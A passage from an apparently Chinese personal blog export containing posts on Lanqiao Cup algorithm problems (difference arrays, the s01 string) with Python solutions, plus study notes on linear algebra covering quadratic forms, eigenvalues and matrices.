<p><img src="/2020/02/03/%E7%AE%97%E6%B3%95%E6%8F%90%E9%AB%98-%E5%88%86%E8%8B%B9%E6%9E%9C/分苹果.png" alt="图片"><br>看到这道题感觉还可以，花了一会就写出了代码，但提交上却TLE，试着简化了简化还是不行，最后找到了其他大佬的解法，通过差分数组求解</p>
<h2 id="我的方法和代码如下"><a href="#我的方法和代码如下" class="headerlink" title="我的方法和代码如下"></a>我的方法和代码如下</h2><p>也可解出答案，但是会超时<br>Time Limit Exceeded</p>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">N</span>,M = <span class="keyword">map</span>(<span class="keyword">int</span>,<span class="built_in">input</span>().<span class="keyword">split</span>(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line">Arr = [<span class="number">0</span>] * <span class="keyword">N</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(M):</span><br><span class="line">    <span class="keyword">a</span>,<span class="keyword">b</span>,<span class="keyword">c</span> = <span class="keyword">map</span>(<span class="keyword">int</span>,<span class="built_in">input</span>().<span class="keyword">split</span>())</span><br><span class="line">    <span class="keyword">for</span> <span class="keyword">j</span> in <span class="built_in">range</span>(<span class="keyword">a</span>,<span class="keyword">b</span>+<span class="number">1</span>):</span><br><span class="line">        Arr[<span class="keyword">j</span>-<span class="number">1</span>] += <span class="keyword">c</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="keyword">N</span>):</span><br><span class="line">    <span class="keyword">print</span>(Arr[i],end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure>
<h2 id="运用差分数组"><a href="#运用差分数组" class="headerlink" title="运用差分数组"></a>运用差分数组</h2><p>代码很简洁，只计算一次就行<br>f[i] = d[i] - d[i-1]<br>d[2] = f[1]+d[0]+f[2] = d[1] + d[2] -d[1] = d[2]<br>数列第i项的值是可以用差分数组的前i项的和计算的，即d[i] = f[i]的前缀和<br>差分数组其实就相当于通过改变区间前段和末端与其他部分的差值，在最后进行累加的时候实行对整个区间的值的改变<br><figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="keyword">N</span>,M = <span class="keyword">map</span>(<span class="keyword">int</span>,<span class="built_in">input</span>().<span class="keyword">split</span>(<span class="string">&#x27; &#x27;</span>))</span><br><span class="line">Arr = [<span class="number">0</span>] * (<span class="keyword">N</span> + <span class="number">2</span>)</span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(M):</span><br><span class="line">    <span class="keyword">a</span>,<span class="keyword">b</span>,<span class="keyword">c</span> = <span class="keyword">map</span>(<span class="keyword">int</span>,<span class="built_in">input</span>().<span class="keyword">split</span>())</span><br><span class="line">    Arr[<span class="keyword">a</span>] += <span class="keyword">c</span></span><br><span class="line">    Arr[<span class="keyword">b</span>+<span class="number">1</span>] -= <span class="keyword">c</span></span><br><span class="line"><span class="keyword">for</span> i in <span class="built_in">range</span>(<span class="number">1</span>,<span class="keyword">N</span>+<span class="number">1</span>):</span><br><span class="line">    Arr[i] += Arr[i-<span class="number">1</span>]</span><br><span class="line">    <span class="keyword">print</span>(Arr[i],end=<span class="string">&#x27; &#x27;</span>)</span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>programming</category>
      </categories>
      <tags>
        <tag>programming</tag>
      </tags>
  </entry>
  <entry>
    <title>算法训练 s01串</title>
    <url>/2020/02/04/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-s01%E4%B8%B2/</url>
    <content><![CDATA[<h3 id="本文为蓝桥杯s01串的题解。"><a href="#本文为蓝桥杯s01串的题解。" class="headerlink" title="本文为蓝桥杯s01串的题解。"></a>本文为蓝桥杯s01串的题解。</h3><span id="more"></span>
<p><img src="/2020/02/04/%E7%AE%97%E6%B3%95%E7%BB%83%E4%B9%A0-s01%E4%B8%B2/s01串.png" alt="图片"></p>
<h1 id="直接计算-暴力求解"><a href="#直接计算-暴力求解" class="headerlink" title="直接计算 暴力求解"></a>直接计算 暴力求解</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">n = <span class="built_in">eval</span>(<span class="built_in">input</span>())</span><br><span class="line">str1 = <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">    <span class="built_in">print</span>(str1)</span><br><span class="line">    <span class="keyword">else</span>:     <span class="comment">#通过两个字符串，一个作为对照一个进行运算，一轮结束后重新赋值后再运算</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n):          </span><br><span class="line">        str2 = <span class="string">&#x27;&#x27;</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">            <span class="keyword">if</span> str1[i] == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">                str2 += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                str2 += <span class="string">&#x27;01&#x27;</span></span><br><span class="line">        str1 = str2</span><br><span class="line">    <span class="built_in">print</span>(str1)</span><br></pre></td></tr></table></figure>
<h1 id="递归运算"><a href="#递归运算" class="headerlink" title="递归运算"></a>递归运算</h1><h2 id="规律："><a href="#规律：" class="headerlink" title="规律："></a>规律：</h2><p>起始  0</p>
<p>n=1:   1</p>
<p>n=2:   01</p>
<p>n=3:   101</p>
<p>n=4:   01101</p>
<p>n=5:   10101101</p>
<p>发现一个串是由前两个串拼接起来<br><figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">def ans(n):</span><br><span class="line">    <span class="keyword">if</span> n == 0:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">&#x27;0&#x27;</span>,<span class="attribute">end</span>=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    elif n == 1:</span><br><span class="line">        <span class="builtin-name">print</span>(<span class="string">&#x27;1&#x27;</span>,<span class="attribute">end</span>=<span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        ans(n-2)</span><br><span class="line">        ans(n-1)</span><br><span class="line">n = eval(input())</span><br><span class="line">ans(n)</span><br></pre></td></tr></table></figure></p>
<h1 id="来个错误的事例"><a href="#来个错误的事例" class="headerlink" title="来个错误的事例"></a>来个错误的事例</h1><p>python字符串一旦创建，里边的元素不可以更改，可以重新赋值，或者变换为列表进行替换<br><figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">n = eval(<span class="selector-tag">input</span>())</span><br><span class="line">str1 = <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="keyword">for</span> <span class="selector-tag">i</span> <span class="keyword">in</span> range(n):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">        <span class="keyword">if</span> str1<span class="selector-attr">[j]</span> == <span class="string">&#x27;0&#x27;</span>:</span><br><span class="line">            str1<span class="selector-attr">[j]</span> = <span class="string">&quot;1&quot;</span> #这里语法错误,元素无法更改</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            str1<span class="selector-class">.insert</span>(j,<span class="string">&quot;0&quot;</span>)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line"><span class="function"><span class="title">print</span><span class="params">(str1)</span></span></span><br></pre></td></tr></table></figure></p>
]]></content>
      <categories>
        <category>programming</category>
      </categories>
      <tags>
        <tag>programming</tag>
      </tags>
  </entry>
  <entry>
    <title>线性代数-二次型</title>
    <url>/2021/05/20/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E4%BA%8C%E6%AC%A1%E5%9E%8B/</url>
    <content><![CDATA[<h2 id="二次型的概念及其标准形"><a href="#二次型的概念及其标准形" class="headerlink" title="二次型的概念及其标准形"></a>二次型的概念及其标准形</h2><h3 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h3><h4 id="二次型的标准形"><a href="#二次型的标准形" class="headerlink" title="二次型的标准形"></a>二次型的标准形</h4><p>二次型只含平方项，即$f(x_1,x_2,\dotsb,x_n)=d_1x_1^2+d_2x_2^2+\dotsb+d_nx_n^2$，称为二次型的标准形</p>
<h4 id="二次型的标准化"><a href="#二次型的标准化" class="headerlink" title="二次型的标准化"></a>二次型的标准化</h4><p>二次型可通过坐标变换$x=Cy$(C可逆)化为标准型<br>$x^TAx\xlongequal{x=Cy}(Cy)^T(Cy)=y^TC^TACy=y^T\Lambda y=d_1y_1^2+d_2y_2^2+\dotsb+d_ny_n^2$，其中$\Lambda=C^TAC$<br>由于A是实对称矩阵，故存在正交变换$x=Qy$(Q为正交矩阵)将$x^TAx$标准化，即$x^TAx\xlongequal{x=Qy}y^TQ^TAQy=y^TQ^{-1}AQy=y^T\Lambda y=\lambda_1y_1^2+\lambda_2y_2^2+\dotsb+\lambda_ny_n^2$，其中$\Lambda=Q^TAQ=Q^{-1}AQ,\lambda_1,\lambda_2,\dotsb,\lambda_n$为A的特征值</p>
<p>(1) 由于二次型的矩阵是实对称矩阵，且唯一，故二次型与实对称矩阵A一一对应<br>(2) 标准型的矩阵是对角矩阵<br>(3) 二次型化为标准形实质上就是将矩阵A化为对角矩阵，由于A是实对称矩阵，故一定可以用正交矩阵将其化为对角矩阵，即二次型总可以利用正交变换化为标准形</p>
<h4 id="惯性指数"><a href="#惯性指数" class="headerlink" title="惯性指数"></a>惯性指数</h4><p>在标准形中，正平方项的个数称为正惯性指数，记为p；负平方项的个数称为负惯性指数，记为q。</p>
<h4 id="惯性定理"><a href="#惯性定理" class="headerlink" title="惯性定理"></a>惯性定理</h4><p>二次型经过可逆坐标变换后，正、负惯性指数保持不变，且$p+q=r(f)=r(A)$</p>
<h4 id="二次型的规范形"><a href="#二次型的规范形" class="headerlink" title="二次型的规范形"></a>二次型的规范形</h4><p>若n元二次型$x^TAx$经过坐标交换$x=Cy$化为标准形<br>$x^TAx\xlongequal{Cy}d_1y_1^2+\dotsb+d_py_p^2-d_{p+1}y_{p+1}^2-\dotsb-d_{p+q}y_{p+q}^2$，其中$d_i&gt;0(i=1,2,\dotsb,p+q)$。再用坐标变换</p>
<script type="math/tex; mode=display">\begin{cases}
    y_1=\frac{1}{\sqrt{d_1}}z_1,\\
    y_2=\frac{1}{\sqrt{d_2}}z_2,\\
    \dotsb\dotsb \\
    y_{p+q}=\frac{1}{\sqrt{d_{p+q}}}z_{p+q},\\
    y_{p+q+1}=z_{p+q+1},\\
    \dotsb\dotsb\\
    y_n=z_n
\end{cases}</script><p>则二次型化为$z_1^2+\dotsb+z_p^2-z_{p+1}^2-\dotsb-z_{p+q}^2$，称为规范形，二次型的规范形是唯一的，但标准形不唯一（与坐标变换有关）</p>
<h4 id="矩阵合同"><a href="#矩阵合同" class="headerlink" title="矩阵合同"></a>矩阵合同</h4><p>若A,B为n阶实对称矩阵，存在可逆矩阵C，使得$C^TAC=B$，则称A与B合同。<br>若A,B为n阶实对称矩阵，则A与B合同$\Leftrightarrow p_A=p_n,q_A=q_n$<br><img src="/2021/05/20/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E4%BA%8C%E6%AC%A1%E5%9E%8B/矩阵合同.png" alt="photo"></p>
<h4 id="坐标变换"><a href="#坐标变换" class="headerlink" title="坐标变换"></a>坐标变换</h4><p>形如$\begin{cases}<br>    x_1=c_{11}y_1+c_{12}y_2+c_{13}y_3,\\<br>    x_2=c_{21}y_1+c_{22}y_2+c_{23}y_3,\\<br>    x_3=c_{31}y_1+c_{32}y_2+c_{33}y_3<br>\end{cases}$，称为坐标变换，记作x=Cy，其中$C=(c_{ij})_{3\times3}$，且C可逆，$x=(x_1,x_2,x_3)^T,y=(y_1,y_2,y_3)^T$</p>
<h3 id="二次型化为标准形的方法"><a href="#二次型化为标准形的方法" class="headerlink" title="二次型化为标准形的方法"></a>二次型化为标准形的方法</h3><h4 id="正交变换"><a href="#正交变换" class="headerlink" title="正交变换"></a>正交变换</h4><ol>
<li>求A的特征值，即由$|\lambda E-A|=0$，得$\lambda_1,\lambda_2,\dotsb,\lambda_n$</li>
<li>求A的特征向量，即由$(\lambda_iE-A)x=0(i=1,2,\dotsb,n)$，得$\alpha_1,\alpha_2,\dotsb,\alpha_n$</li>
<li>对$\alpha_1,\alpha_2,\dotsb,\alpha_n$进行施密特正交化、单位化，的$\eta_1,\eta_2,\dotsb,\eta_n$(正交化只针对重特征值对应的特征向量)</li>
<li>令$Q=(\eta_1,\eta_2,\dotsb,\eta_n)$，则x=Qy为正交变换</li>
<li>写出标准形$\lambda_1y_1^2+\lambda_2y_2^2+\dotsb+\lambda_ny_n^2$</li>
</ol>
<h4 id="配方法"><a href="#配方法" class="headerlink" title="配方法"></a>配方法</h4><p><img src="/2021/05/20/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E4%BA%8C%E6%AC%A1%E5%9E%8B/配方法.png" alt="photo"></p>
<h2 id="正定二次型与正定矩阵"><a href="#正定二次型与正定矩阵" class="headerlink" title="正定二次型与正定矩阵"></a>正定二次型与正定矩阵</h2><h3 id="正定二次型的概念"><a href="#正定二次型的概念" class="headerlink" title="正定二次型的概念"></a>正定二次型的概念</h3><p>设二次型$f(x_1,x_2,\dotsb,x_n)=x^TAx$(A为对称矩阵)，若对任意$x\ne0$，都有$x^TAx&gt;0$，则称二次型正定，称A为正定矩阵</p>
<h3 id="正定二次型的判别"><a href="#正定二次型的判别" class="headerlink" title="正定二次型的判别"></a>正定二次型的判别</h3><ol>
<li>二次型$x^TAx$正定$\Leftrightarrow$A的特征值全大于0</li>
<li>二次型$x^TAx$正定$\Leftrightarrow$A的顺序主子式全大于0</li>
<li>设A为实对称矩阵，则A正定$\Leftrightarrow$A合同与单位矩阵E</li>
<li>设A为实对称矩阵，则A正定$\Leftrightarrow$正惯性指数$p=n=r(A)$</li>
<li>设A为实对称矩阵，则A正定$\Leftrightarrow$存在可逆矩阵P，使得$A=P^TP$</li>
<li>二次型$x^TAx$正定的必要条件是$a_{ii}&gt;0(i=1,2,\dotsb,n)$</li>
</ol>
<p><img src="/2021/05/20/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E4%BA%8C%E6%AC%A1%E5%9E%8B/正定判别.png" alt="photo"></p>
]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线性代数</tag>
      </tags>
  </entry>
  <entry>
    <title>线性代数-矩阵的特征值和特征向量</title>
    <url>/2021/05/06/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E7%89%B9%E5%BE%81%E5%80%BC%E5%92%8C%E7%89%B9%E5%BE%81%E5%90%91%E9%87%8F/</url>
    <content><![CDATA[<h2 id="特征值与特征向量"><a href="#特征值与特征向量" class="headerlink" title="特征值与特征向量"></a>特征值与特征向量</h2><h3 id="特征值与特征向量的理论背景"><a href="#特征值与特征向量的理论背景" class="headerlink" title="特征值与特征向量的理论背景"></a>特征值与特征向量的理论背景</h3><p>在一个多项式中，未知数的个数为任意多个，且每一项次数都是2的多项式称为二次型，二次型分为两种类型：即非标准二次型及标准二次型。<br><img src="/2021/05/06/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E7%89%B9%E5%BE%81%E5%80%BC%E5%92%8C%E7%89%B9%E5%BE%81%E5%90%91%E9%87%8F/背景.png" alt="图片"></p>
<h3 id="特征值与特征向量的概念与性质"><a href="#特征值与特征向量的概念与性质" class="headerlink" title="特征值与特征向量的概念与性质"></a>特征值与特征向量的概念与性质</h3><p>设 A 为 n 阶矩阵，若存在常数$\lambda$及 n 为非零列向量$\alpha$，使得$A\alpha=\lambda\alpha$称$\lambda$为矩阵 A 的特征值，$\alpha$为矩阵 A 的属性特征值$\lambda$的特征向量<br><img src="/2021/05/06/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E7%89%B9%E5%BE%81%E5%80%BC%E5%92%8C%E7%89%B9%E5%BE%81%E5%90%91%E9%87%8F/特征值.png" alt="图片"></p>
<h3 id="特征方程"><a href="#特征方程" class="headerlink" title="特征方程"></a>特征方程</h3><p>设$A=\begin{bmatrix}<br>    a_{11} &amp;a_{12} &amp;\dotsb &amp;a_{1n} \\<br>    a_{21} &amp;a_{22} &amp;\dotsb &amp;a_{2n} \\<br>    \vdots &amp;\vdots &amp; &amp;\vdots \\<br>    a_{n1} &amp;a_{n2} &amp;\dotsb &amp;a_{nn}<br>\end{bmatrix}$称$|\lambda E-A|=0$为矩阵 A 的特征方程<br><img src="/2021/05/06/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5%E7%9A%84%E7%89%B9%E5%BE%81%E5%80%BC%E5%92%8C%E7%89%B9%E5%BE%81%E5%90%91%E9%87%8F/特征方程.png" alt="图片"></p>
<h3 id="求特征值与特征向量"><a href="#求特征值与特征向量" class="headerlink" title="求特征值与特征向量"></a>求特征值与特征向量</h3><p>方法一：$\begin{cases}<br>    解方程 |\lambda E-A|=0，的特征值\lambda \\<br>    解方程组 (\lambda E-A)\alpha=0，的特征向量\alpha<br>\end{cases}$<br>方法二：利用定义$A\alpha=\lambda\alpha(a\ne0)$</p>
<h3 id="特征值的性质"><a href="#特征值的性质" class="headerlink" title="特征值的性质"></a>特征值的性质</h3><p>设 A 为 n 阶矩阵，$\lambda_1,\lambda_2,\dotsb,\lambda_n$ 为 A 的特征值，则有<br>(1) $\lambda_1+\lambda_2+\dotsb+\lambda_n=\sum_{i=1}^na_{ii}=tr(A)$，称$tr(A)=\sum_{i=1}^na_{ii}$为A的迹<br>(2) $\lambda_1\lambda_2\dotsb\lambda_n=|A|$</p>
<p>A 可逆$\Leftrightarrow|A|\ne0\Leftrightarrow\lambda_i\ne0(i\le i\le n)$</p>
<h3 id="特征向量的性质"><a href="#特征向量的性质" class="headerlink" title="特征向量的性质"></a>特征向量的性质</h3><ol>
<li>A的不同特征值对应的特征向量时线性无关的</li>
<li>设A的n阶矩阵，$\lambda_k$为A的k重特征值$k\ge1$，则属于$\lambda_k$的线性无关的特征向量个数不超过k个</li>
<li>设A为n阶矩阵，$A\alpha_1=\lambda_1\alpha_1,A\alpha_2=\lambda_2\alpha_2,\lambda_1\ne\lambda_2$，其中，$\alpha_1\ne0,\alpha_2\ne0$，则$\alpha_1+\alpha_2$不是A的特征向量</li>
</ol>
<p>特征向量不能是零向量</p>
<h2 id="矩阵相似"><a href="#矩阵相似" class="headerlink" title="矩阵相似"></a>矩阵相似</h2><h3 id="矩阵A相似于对角形"><a href="#矩阵A相似于对角形" class="headerlink" title="矩阵A相似于对角形"></a>矩阵A相似于对角形</h3><h4 id="A相似于对角矩阵的条件"><a href="#A相似于对角矩阵的条件" class="headerlink" title="A相似于对角矩阵的条件"></a>A相似于对角矩阵的条件</h4><p>设A为n阶矩阵：<br>(1) 充分条件：A有n个不同的特征值$\Rightarrow A\sim\Lambda$<br>(2) 充要条件：$A\sim\Lambda\Leftrightarrow A$有n个线性无关的特征向量<br>(3) 充要条件：$A\sim\Lambda\Leftrightarrow A$的k重特征值对应k个线性无关的特征向量</p>
<h4 id="相似的定义"><a href="#相似的定义" class="headerlink" title="相似的定义"></a>相似的定义</h4><p>设A,B为n阶矩阵，若存在可逆矩阵P,使得$P^{-1}AP=B$,称矩阵A与矩阵B相似，记为A~B.若存在可逆矩阵P,使得$P^{-1}AP=A$,其中$\Lambda$为对角矩阵，则称A可以相似对角化</p>
<h4 id="相似对角化的步骤"><a href="#相似对角化的步骤" class="headerlink" title="相似对角化的步骤"></a>相似对角化的步骤</h4><p>对于$A_{n\times n}$，求可逆矩阵P，使得$P^{-1}AP=A$的步骤：<br>(1) 由$|\lambda E-A|=0$，求A的特征值$\lambda_1,\lambda_2,\dotsb,\lambda_n$<br>(2) 对每个$\lambda$，由$(\lambda E-A)x=0$，求基础解系，这些基础解系构成了A的一组特征向量<br>(3) 令$P=(\alpha_1,\alpha_2,\dotsb,\alpha_n)$，当p可逆时，有</p>
<script type="math/tex; mode=display">P^{-1}AP=\Lambda=\begin{bmatrix}
    \lambda_1 \\
    &\lambda_2 \\
    & &\ddots \\
    & & &\lambda_n
\end{bmatrix}</script><p>称矩阵A可相似对角化，或A可以对角化，或A与对角矩阵相似</p>
<h3 id="特征值与特征向量的常用结论"><a href="#特征值与特征向量的常用结论" class="headerlink" title="特征值与特征向量的常用结论"></a>特征值与特征向量的常用结论</h3><div class="table-container">
<table>
<thead>
<tr>
<th>矩阵</th>
<th>$A$</th>
<th>$A^n$</th>
<th>$A+KE$</th>
<th>$f(A)$</th>
<th>$A^{-1}$</th>
<th>$A^*$</th>
<th>$P^{-1}AP$</th>
<th>$A^T$</th>
</tr>
</thead>
<tbody>
<tr>
<td>特征值</td>
<td>$\lambda$</td>
<td>$\lambda^n$</td>
<td>$\lambda+k$</td>
<td>$f(\lambda)$</td>
<td>$\frac{1}{\lambda}$</td>
<td>$\frac{\lvert A\rvert}{\lambda}$</td>
<td>$\lambda$</td>
<td>$\lambda$</td>
</tr>
<tr>
<td>特征向量</td>
<td>$\alpha$</td>
<td>$\alpha$</td>
<td>$\alpha$</td>
<td>$\alpha$</td>
<td>$\alpha$</td>
<td>$\alpha$</td>
<td>$P^{-1}\alpha$</td>
<td>/</td>
</tr>
</tbody>
</table>
</div>
<h3 id="相似矩阵的性质"><a href="#相似矩阵的性质" class="headerlink" title="相似矩阵的性质"></a>相似矩阵的性质</h3><ol>
<li>设A、B均为n阶矩阵，若$A\sim B$，则：<ol>
<li>$A^T\sim B^T$</li>
<li>$A^n\sim B^n$</li>
<li>$f(A)\sim f(B)$，其中f为多项式</li>
<li>当A、B可逆时，$A^{-1}\sim B^{-1},A^<em>\sim B^</em>$</li>
<li>$r(A)=r(B)$</li>
</ol>
</li>
<li>$A\sim B\overset{\Rightarrow}{\nLeftarrow}|\lambda E-A|=|\lambda E-B|$</li>
</ol>
<h2 id="实对称矩阵"><a href="#实对称矩阵" class="headerlink" title="实对称矩阵"></a>实对称矩阵</h2><h3 id="实对称定义"><a href="#实对称定义" class="headerlink" title="实对称定义"></a>实对称定义</h3><p>设A是n阶矩阵，若$A^T=A$，则称A为实对称矩阵</p>
<h3 id="实对称矩阵的对角化"><a href="#实对称矩阵的对角化" class="headerlink" title="实对称矩阵的对角化"></a>实对称矩阵的对角化</h3><ol>
<li>实对称矩阵必相似于对角矩阵</li>
<li>实对称矩阵可用正交矩阵对角化</li>
<li>实对称矩阵不同特征值的特征向量相互正交</li>
<li>实对称矩阵的特征值必为实数</li>
</ol>
<h3 id="实对称矩阵用正交矩阵对角化的步骤"><a href="#实对称矩阵用正交矩阵对角化的步骤" class="headerlink" title="实对称矩阵用正交矩阵对角化的步骤"></a>实对称矩阵用正交矩阵对角化的步骤</h3><ol>
<li>设A为n阶实对称矩阵，求A的特征值</li>
<li>求A的特征向量</li>
<li>若A的特征值都是单重特征值，则只需单位化。若A的特征值中存在多重特征值，则先对重特征值对应的特征向量进行施密特正交化，再单位化</li>
<li>由正交单位化后的向量构成正交矩阵Q，则$Q^{-1}AQ=A$</li>
</ol>
<h4 id="施密特正交化"><a href="#施密特正交化" class="headerlink" title="施密特正交化"></a>施密特正交化</h4><p>把一组线性无关的向量组转化为一组两两正交且规范的向量组的过程称为施密特正交化<br>设$a_1,a_2,\dotsb,a_s$线性相关，施密特正交互过程分为两个步骤：<br>(1)正交化<br>令$\beta_1=\alpha_1,\beta_2=\alpha_2-\frac{(\alpha_2,\beta_1)}{(\beta_1,\beta_1)}\beta_1,\dotsb,\\\beta_n=\alpha_n-\frac{(\alpha_n\beta_1)}{(\beta_1,\beta_1)}\beta_1-\frac{(\alpha_n\beta_2)}{(\beta_2,\beta_2)}\beta_2-\dotsb-\frac{(\alpha_n\beta_{n-1})}{(\beta_{n-1},\beta_{n-1})}\beta_{n-1}$,<br>则$\beta_1,\beta_2,\dotsb,\beta_n$两两正交<br>(2)规范化<br>令$\gamma_1=\frac{1}{|\beta_1|}\beta_1,\gamma_2=\frac{1}{|\beta_2|}\beta_2,\dotsb,\gamma_b=\frac{1}{|\beta_b|}\beta_b$，则$\gamma_1,\gamma_2,\dotsb,\gamma_n$为两两正交且规范的向量组</p>
<h2 id="确定参数"><a href="#确定参数" class="headerlink" title="确定参数"></a>确定参数</h2><h3 id="确定参数的常见情形"><a href="#确定参数的常见情形" class="headerlink" title="确定参数的常见情形"></a>确定参数的常见情形</h3><p>确定参数有以下常见情形：<br>(1) 设$A=(a_{ij})_{m\times n},B=(b_{ij})_{m\times n},A\sim B\Rightarrow\begin{cases}<br>    |A|=|B| \\<br>    \sum_{i=1}^na_{ii}=\sum_{i=1}^nb_{ii}<br>\end{cases}$<br>(2) 已知$\lambda_0$是A的一个特征值$\Rightarrow|\lambda_0 -A|=0$<br>(3) 已知$\alpha_0$是A的一个特征向量$\Rightarrow A\alpha_0=\lambda\alpha_0$（解方程组）<br>(4) 对n阶矩阵A,$r(A)&lt;n\Rightarrow|A|=0$(常用方法)<br>(5) $\lambda E-A|=|\lambda E-B|$，且A,B均为实对称矩阵，则$A\sim B$</p>
<h3 id="矩阵相似的必要条件"><a href="#矩阵相似的必要条件" class="headerlink" title="矩阵相似的必要条件"></a>矩阵相似的必要条件</h3><script type="math/tex; mode=display">A\sim B\begin{cases}
    |A|=|B| \\
    \sum_{i=1}^na_{ii}=\sum_{i=1}^nb_{ii}(即tr(A)=tr(B)) \\
    r(A) = r(B) \\
    |\lambda E-A|=|\lambda E-B| \\
    A与B有相同的特征值
\end{cases}</script>]]></content>
      <categories>
        <category>数学</category>
      </categories>
      <tags>
        <tag>线性代数</tag>
      </tags>
  </entry>
  <entry>
    <title>线性代数-矩阵</title>
    <url>/2021/05/02/%E7%BA%BF%E6%80%A7%E4%BB%A3%E6%95%B0-%E7%9F%A9%E9%98%B5/</url>
    <content><![CDATA[<h2 id="矩阵"><a href="#矩阵" class="headerlink" title="矩阵"></a>矩阵</h2><h3 id="矩阵的概念及运算"><a href="#矩阵的概念及运算" class="headerlink" title="矩阵的概念及运算"></a>矩阵的概念及运算</h3><h4 id="矩阵的概念"><a href="#矩阵的概念" class="headerlink" title="矩阵的概念"></a>矩阵的概念</h4><p><strong>定义</strong> $m\times n$个数排列成如下 m 行 n 列的一个表格</p>
<script type="math/tex; mode=display">\begin{bmatrix}
    a_{11} &a_{12} &\dotsb &a_{1n} \\
    a_{21} &a_{22} &\dotsb &a_{2n} \\
    \vdots &\vdots & &\vdots \\
    a_{m1} &a_{m2} &\dotsb &a_{mn}
\end{bmatrix}</script><p>称为是一个 $m\times n$ 矩阵，当 m = n 时，矩阵A称为 n 阶矩阵或叫 n 阶方阵<br>如果一个矩阵的所有元素都是0，则称这个矩阵是零矩阵，简记为$O$<br><span id="more"></span></p>
<p><strong>定义</strong>（矩阵多项式） 设A是 n 阶矩阵，$f(x)=a_mx^m+\dotsb+a_1x+a_0$是 x 的多项式，则称$a_mA^m+a_{m-1}A^{m-1}+\dotsb+a_1A+a_0E$为矩阵多项式，记为$f(A)$</p>
<h4 id="特殊矩阵"><a href="#特殊矩阵" class="headerlink" title="特殊矩阵"></a>特殊矩阵</h4><ol>
<li>单位矩阵</li>
<li>转置矩阵：将A的行与列互换后所得的矩阵，称为A的转置矩阵，记作$A^T$</li>
<li>对称矩阵：若$A^T=A$，即$a_{ij}=a_{ji}(i,j=1,2,\dotsb,n)$，则称A为对称矩阵；若$A^T=-A$，即$a_{ij}=-a_{ji}(i,j=1,2,\dotsb,n)$，则称A为反对称矩阵</li>
<li>正交矩阵：设A为n阶矩阵，若$A^TA=AA^T=E$，则称A为正交矩阵</li>
<li>伴随矩阵：$A^*=(A_{ij})_{n\times n},A_{ij}=(-1)^{i+j}\cdot M_{ij}$，其中$M_{ij}$为|A|中去掉第i行、第j列后的n-1阶子式</li>
<li>数量矩阵：数 k 与单位阵 E 的积 $kE$</li>
<li><em>对角阵：</em> 非对角元素都是 0 的矩阵（即$\forall i\not ={j}$恒有$a_{ij}=0$）称为对角阵，记成 $\Lambda.\Lambda=diag[a_1,a_2,\dotsb,a_n]$</li>
<li><em>上（下）三角阵：</em> 当 $i&gt;j(i&lt;j)$时，有$a_{ij}=0$的矩阵</li>
</ol>
<p>关于对角矩阵<br>(1) $\Lambda_1\Lambda_2=\Lambda_2\Lambda_1$<br>(2) $\begin{bmatrix}<br>    a_1 &amp; &amp; \\<br>     &amp;a_2 &amp; \\<br>     &amp; &amp;a_3<br>\end{bmatrix}=\begin{bmatrix}<br>    a_1^n &amp;0 &amp;0 \\<br>    0 &amp;a_2^n &amp;0 \\<br>    0 &amp;0 &amp;a_3^n<br>\end{bmatrix}$<br>(3) $\begin{bmatrix}<br>    a_1 &amp; &amp; \\<br>     &amp;a_2 &amp; \\<br>     &amp; &amp;a_3<br>\end{bmatrix}^{-1}=\begin{bmatrix}<br>    \frac{1}{a_1} &amp; &amp; \\<br>     &amp;\frac{1}{a_2} &amp; \\<br>     &amp; &amp;\frac{1}{a_3}<br>\end{bmatrix}$<br>关于$\alpha\beta^T,\beta\alpha^T,\alpha^T\beta,\beta^T\alpha$</p>
<p><strong>同型矩阵</strong> 两个矩阵 $A=[a_{ij}]_{m\times n},B=[b_{ij}]_{s\times t}$ ，如果 m = s，n = t，则称A与B是同型矩阵<br>如果两个同型矩阵对应的元素都相等，则称矩阵A与B相等<br>n 阶方阵 $A=[a_{ij}]_{m\times n}$ 的元素所构成的行列式称为 n 阶矩阵 A 的行列式，记成 $|A|$ 或 $\det A$</p>
